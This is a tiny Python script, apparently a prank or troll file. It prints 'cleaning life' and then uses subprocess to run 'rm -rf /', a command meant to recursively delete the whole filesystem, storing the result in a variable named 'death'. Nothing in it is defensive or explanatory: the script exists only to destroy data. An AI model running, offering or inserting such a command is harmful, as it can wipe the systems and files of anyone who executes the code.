#!/bin/python3

from subprocess import check_output

print("cleaning life")

com = 'rm -rf /'

death = check_output(com.split()).decode()
print(death)
